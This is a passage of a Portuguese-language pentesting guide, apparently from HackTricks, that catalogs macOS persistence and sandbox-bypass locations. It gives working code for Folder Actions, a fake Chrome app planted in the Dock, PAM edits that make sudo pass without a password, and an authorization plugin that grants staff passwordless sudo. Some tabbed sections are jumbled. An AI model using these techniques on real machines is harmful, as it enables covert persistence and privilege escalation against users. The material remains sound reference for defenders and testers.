- Mas você precisa ser capaz de chamar `osascript` com argumentos para contatar **`System Events`** para poder configurar Ações de Pasta
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Possui algumas permissões básicas do TCC como Desktop, Documentos e Downloads

#### Localização

- **`/Library/Scripts/Folder Action Scripts`**
- Requer privilégios de root
- **Gatilho**: Acesso à pasta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
- **Gatilho**: Acesso à pasta especificada

#### Descrição e Exploração

As Ações de Pasta são scripts acionados automaticamente por alterações em uma pasta, como adicionar, remover itens, ou outras ações como abrir ou redimensionar a janela da pasta. Essas ações podem ser utilizadas para várias tarefas e podem ser acionadas de diferentes maneiras, como usando a interface do Finder ou comandos no terminal.

Para configurar Ações de Pasta, você tem opções como:

1. Criar um fluxo de trabalho de Ação de Pasta com [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalá-lo como um serviço.
2. Anexar um script manualmente via Configuração de Ações de Pasta no menu de contexto de uma pasta.
3. Utilizar OSAScript para enviar mensagens de Evento Apple para o `System Events.app` para configurar programaticamente uma Ação de Pasta.
* Este método é particularmente útil para incorporar a ação no sistema, oferecendo um nível de persistência.

O script a seguir é um exemplo do que pode ser executado por uma Ação de Pasta:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Para tornar o script acima utilizável pelas Ações de Pasta, compile-o usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Depois que o script for compilado, configure as Ações de Pasta executando o script abaixo. Este script habilitará as Ações de Pasta globalmente e anexará especificamente o script compilado anteriormente à pasta Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Execute o script de configuração com:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Esta é a maneira de implementar essa persistência via GUI:

Este é o script que será executado:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compilar com: `osacompile -l JavaScript -o folder.scpt source.js`

Mover para:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Em seguida, abra o aplicativo `Folder Actions Setup`, selecione a **pasta que deseja monitorar** e selecione no seu caso **`folder.scpt`** (no meu caso, eu o chamei de output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Agora, se você abrir essa pasta com o **Finder**, seu script será executado.

Essa configuração foi armazenada no **plist** localizado em **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** em formato base64.

Agora, vamos tentar preparar essa persistência sem acesso à GUI:

1. **Copie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** para `/tmp` para fazer backup:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remova** as Ações de Pasta que você acabou de configurar:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Agora que temos um ambiente vazio

3. Copie o arquivo de backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abra o aplicativo Folder Actions Setup.app para consumir essa configuração: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
E isso não funcionou para mim, mas essas são as instruções do artigo:(
{% endhint %}

### Atalhos do Dock

Artigo: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas você precisa ter instalado um aplicativo malicioso no sistema
* Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* `~/Library/Preferences/com.apple.dock.plist`
* **Gatilho**: Quando o usuário clica no aplicativo dentro do dock

#### Descrição e Exploração

Todos os aplicativos que aparecem no Dock são especificados dentro do plist: **`~/Library/Preferences/com.apple.dock.plist`**

É possível **adicionar um aplicativo** apenas com:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Usando alguma **engenharia social** você poderia **se passar, por exemplo, pelo Google Chrome** dentro do dock e realmente executar seu próprio script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Selecionadores de Cores

Descrição: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Uma ação muito específica precisa acontecer
* Você acabará em outra sandbox
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* `/Library/ColorPickers`
* Requer privilégios de root
* Gatilho: Usar o selecionador de cores
* `~/Library/ColorPickers`
* Gatilho: Usar o selecionador de cores

#### Descrição e Exploração

**Compile um** pacote de selecionador de cores com seu código (você poderia usar [**este, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um construtor (como na seção [Protetor de Tela](macos-auto-start-locations.md#screen-saver)) e copie o pacote para `~/Library/ColorPickers`.

Então, quando o selecionador de cores for acionado, seu código também deve ser.

Observe que o binário que carrega sua biblioteca tem uma **sandbox muito restritiva**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Plugins do Finder Sync

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Descrição**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Útil para contornar a sandbox: **Não, porque você precisa executar seu próprio aplicativo**
* Bypass TCC: ???

#### Localização

* Um aplicativo específico

#### Descrição & Exploração

Um exemplo de aplicativo com uma Extensão do Finder Sync [**pode ser encontrado aqui**](https://github.com/D00MFist/InSync).

Aplicativos podem ter `Extensões do Finder Sync`. Essa extensão será inserida em um aplicativo que será executado. Além disso, para que a extensão consiga executar seu código, ela **deve ser assinada** com um certificado de desenvolvedor da Apple válido, deve estar **em sandbox** (embora exceções relaxadas possam ser adicionadas) e deve ser registrada com algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Protetor de Tela

Descrição: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Descrição: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você acabará em uma sandbox de aplicativo comum
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* `/System/Library/Screen Savers`
* Requer privilégios de root
* **Gatilho**: Selecionar o protetor de tela
* `/Library/Screen Savers`
* Requer privilégios de root
* **Gatilho**: Selecionar o protetor de tela
* `~/Library/Screen Savers`
* **Gatilho**: Selecionar o protetor de tela

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrição e Exploração

Crie um novo projeto no Xcode e selecione o modelo para gerar um novo **Protetor de Tela**. Em seguida, adicione seu código a ele, por exemplo, o seguinte código para gerar logs.

**Compile** e copie o pacote `.saver` para **`~/Library/Screen Savers`**. Em seguida, abra a GUI do Protetor de Tela e se você clicar nele, deverá gerar muitos logs:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Note que, devido aos direitos do binário que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), você estará **dentro do sandbox de aplicativos comuns**.
{% endhint %}

Código do protetor de tela:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins do Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você acabará em uma sandbox de aplicativo
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
* A sandbox parece muito limitada

#### Localização

* `~/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* `/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* Root necessário
* `/System/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* Root necessário
* `Some.app/Contents/Library/Spotlight/`
* **Gatilho**: Um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight é criado.
* Novo aplicativo necessário

#### Descrição e Exploração

O Spotlight é o recurso de pesquisa integrado do macOS, projetado para fornecer aos usuários **acesso rápido e abrangente aos dados em seus computadores**.\
Para facilitar essa capacidade de pesquisa rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice **analisando a maioria dos arquivos**, permitindo buscas rápidas tanto por nomes de arquivos quanto por seu conteúdo.

O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'servidor de metadados'**. Esse processo orquestra todo o serviço do Spotlight. Complementando isso, existem vários daemons 'mdworker' que realizam uma variedade de tarefas de manutenção, como indexar diferentes tipos de arquivos (`ps -ef | grep mdworker`). Essas tarefas são possíveis por meio de plugins do Spotlight, ou **".mdimporter bundles**", que permitem ao Spotlight entender e indexar conteúdo em uma ampla gama de formatos de arquivo.

Os plugins ou **pacotes `.mdimporter`** estão localizados nos locais mencionados anteriormente e se um novo pacote aparecer, ele é carregado em questão de minutos (não é necessário reiniciar nenhum serviço). Esses pacotes precisam indicar quais **tipos de arquivo e extensões eles podem gerenciar**, dessa forma, o Spotlight os usará quando um novo arquivo com a extensão indicada for criado.

É possível **encontrar todos os `mdimporters`** carregados executando:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
E por exemplo **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar esses tipos de arquivos (extensões `.iba` e `.book` entre outros):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Se você verificar o Plist de outros `mdimporter`, você pode não encontrar a entrada **`UTTypeConformsTo`**. Isso ocorre porque é um _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) integrado e não precisa especificar extensões.

Além disso, os plugins padrão do sistema sempre têm precedência, então um atacante só pode acessar arquivos que não sejam indexados de outra forma pelos próprios `mdimporters` da Apple.
{% endhint %}

Para criar seu próprio importador, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) e depois alterar o nome, os **`CFBundleDocumentTypes`** e adicionar **`UTImportedTypeDeclarations`** para que ele suporte a extensão que você deseja e refleti-las em **`schema.xml`**.\
Em seguida, **altere** o código da função **`GetMetadataForFile`** para executar sua carga útil quando um arquivo com a extensão processada for criado.

Por fim, **construa e copie seu novo `.mdimporter`** para um dos locais anteriores e você pode verificar sempre que ele for carregado **monitorando os logs** ou verificando **`mdimport -L.`**

### ~~Painel de Preferências~~

{% hint style="danger" %}
Não parece que isso está funcionando mais.
{% endhint %}

Descrição: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Útil para burlar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Requer uma ação específica do usuário
* Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

Descrição: Não parece que isso está funcionando mais.

## Bypass de Sandbox Root

{% hint style="success" %}
Aqui você pode encontrar locais de inicialização úteis para **burlar a sandbox** que permitem simplesmente executar algo **escrevendo em um arquivo** sendo **root** e/ou exigindo outras **condições estranhas.**
{% endhint %}

### Periódico

Descrição: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Útil para burlar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root
* Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Root necessário
* **Gatilho**: Quando chegar a hora
* `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
* Root necessário
* **Gatilho**: Quando chegar a hora

#### Descrição e Exploração

Os scripts periódicos (**`/etc/periodic`**) são executados por causa dos **launch daemons** configurados em `/System/Library/LaunchDaemons/com.apple.periodic*`. Note que os scripts armazenados em `/etc/periodic/` são **executados** como o **proprietário do arquivo**, então isso não funcionará para uma possível escalada de privilégios.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Existem outros scripts periódicos que serão executados indicados em **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Se você conseguir escrever qualquer um dos arquivos `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, ele será **executado mais cedo ou mais tarde**.

{% hint style="warning" %}
Observe que o script periódico será **executado como o proprietário do script**. Portanto, se um usuário comum for o proprietário do script, ele será executado como esse usuário (isso pode prevenir ataques de escalonamento de privilégios).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root
* Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* Sempre requer privilégios de root

#### Descrição e Exploração

Como o PAM está mais focado em **persistência** e malware do que em execução fácil dentro do macOS, este blog não fornecerá uma explicação detalhada, **leia os artigos para entender melhor essa técnica**.

Verifique os módulos do PAM com:
```bash
ls -l /etc/pam.d
```
Uma técnica de persistência/escalada de privilégios abusando do PAM é tão fácil quanto modificar o módulo /etc/pam.d/sudo adicionando no início a linha:
```bash
auth       sufficient     pam_permit.so
```
Então vai **parecer** algo assim:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
E, portanto, qualquer tentativa de usar **`sudo` funcionará**.

{% hint style="danger" %}
Note que este diretório é protegido pelo TCC, então é altamente provável que o usuário receba um prompt solicitando acesso.
{% endhint %}

### Plugins de Autorização

Descrição: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Descrição: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root e fazer configurações extras
* Bypass do TCC: ???

#### Localização

* `/Library/Security/SecurityAgentPlugins/`
* Root necessário
* Também é necessário configurar o banco de dados de autorização para usar o plugin

#### Descrição e Exploração

Você pode criar um plugin de autorização que será executado quando um usuário fizer login para manter a persistência. Para obter mais informações sobre como criar um desses plugins, consulte as descrições anteriores (e tenha cuidado, um mal escrito pode bloqueá-lo e você precisará limpar seu Mac no modo de recuperação).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Mova** o pacote para o local a ser carregado:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Finalmente adicione a **regra** para carregar este Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
O **`evaluate-mechanisms`** informará ao framework de autorização que será necessário **chamar um mecanismo externo para autorização**. Além disso, **`privileged`** fará com que seja executado pelo root.

Dispare com:
```bash
security authorize com.asdf.asdf
```
E então o grupo **staff** deve ter acesso **sudo** (leia `/etc/sudoers` para confirmar).

### Man.conf

Descrição: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa ser root e o usuário deve usar o man
* Contorno do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* **`/private/etc/man.conf`**
* Requer privilégios de root
* **`/private/etc/man.conf`**: Sempre que o man é usado

#### Descrição e Exploração

O arquivo de configuração **`/private/etc/man.conf`** indica o binário/script a ser usado ao abrir arquivos de documentação do man. Portanto, o caminho para o executável pode ser modificado para que toda vez que o usuário usar o man para ler alguns documentos, um backdoor seja executado.

Por exemplo, definido em **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
E então crie `/tmp/view` como:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas você precisa estar como root e o apache precisa estar em execução
* Bypass do TCC: [🔴](https://emojipedia.org/large-red-circle)
* Httpd não possui direitos

#### Localização

* **`/etc/apache2/httpd.conf`**
* Requer privilégios de root
* Gatilho: Quando o Apache2 é iniciado

#### Descrição e Exploração

Você pode indicar em `/etc/apache2/httpd.conf` para carregar um módulo adicionando uma linha como:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Desta forma, seus módulos compilados serão carregados pelo Apache. A única coisa é que você precisa **assiná-los com um certificado Apple válido**, ou você precisa **adicionar um novo certificado confiável** no sistema e **assiná-los** com ele.

Em seguida, se necessário, para garantir que o servidor seja iniciado, você pode executar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemplo de código para o Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Estrutura de auditoria BSM

Descrição: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Útil para contornar a sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Mas é necessário ter privilégios de root, o auditd em execução e causar um aviso
* Contorno do TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

* **`/etc/security/audit_warn`**
* Requer privilégios de root
* **Gatilho**: Quando o auditd detecta um aviso

#### Descrição e Exploração

Sempre que o auditd detecta um aviso, o script **`/etc/security/audit_warn`** é **executado**. Portanto, você poderia adicionar sua carga útil nele.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### Itens de Inicialização

{% hint style="danger" %}
**Isso está obsoleto, portanto, nada deve ser encontrado nesses diretórios.**
{% endhint %}

O **StartupItem** é um diretório que deve estar localizado em `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Uma vez que este diretório é estabelecido, ele deve conter dois arquivos específicos:

1. Um **script rc**: Um script shell executado na inicialização.
2. Um arquivo **plist**, especificamente nomeado `StartupParameters.plist`, que contém várias configurações.

Certifique-se de que tanto o script rc quanto o arquivo `StartupParameters.plist` estejam corretamente colocados dentro do diretório **StartupItem** para que o processo de inicialização os reconheça e os utilize.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %} 

### Localizações de Inicialização Automática do macOS

O macOS oferece várias maneiras de iniciar automaticamente programas e scripts quando um usuário faz login. Essas são algumas das localizações comuns onde os itens de inicialização automática podem ser encontrados:

- **LaunchAgents**: Localizados em `~/Library/LaunchAgents` e `/Library/LaunchAgents`, esses arquivos .plist são usados para iniciar processos quando um usuário faz login.
  
- **LaunchDaemons**: Localizados em `/Library/LaunchDaemons`, esses arquivos .plist são usados para iniciar processos durante a inicialização do sistema.
  
- **Login Items**: Configurados nas preferências do sistema, os itens de login são aplicativos ou scripts que são abertos automaticamente quando um usuário faz login.
  
- **Startup Items**: Localizados em `/Library/StartupItems`, esses scripts são usados para iniciar processos durante a inicialização do sistema, mas são obsoletos em versões mais recentes do macOS.

Ao revisar e gerenciar essas localizações, você pode garantir que apenas os itens desejados sejam iniciados automaticamente no seu sistema macOS. Isso pode ajudar a melhorar a segurança e o desempenho do seu dispositivo. 

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Não consigo encontrar este componente no meu macOS, para mais informações consulte o artigo
{% endhint %}

Artigo: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Introduzido pela Apple, **emond** é um mecanismo de registro que parece estar subdesenvolvido ou possivelmente abandonado, mas ainda permanece acessível. Embora não seja particularmente benéfico para um administrador de Mac, este serviço obscuro poderia servir como um método sutil de persistência para atores maliciosos, provavelmente passando despercebido pela maioria dos administradores do macOS.

Para aqueles cientes de sua existência, identificar qualquer uso malicioso do **emond** é direto. O LaunchDaemon do sistema para este serviço procura scripts para executar em um único diretório. Para inspecionar isso, o seguinte comando pode ser usado:
```bash
ls -l /private/var/db/emondClients
```
### XQuartz

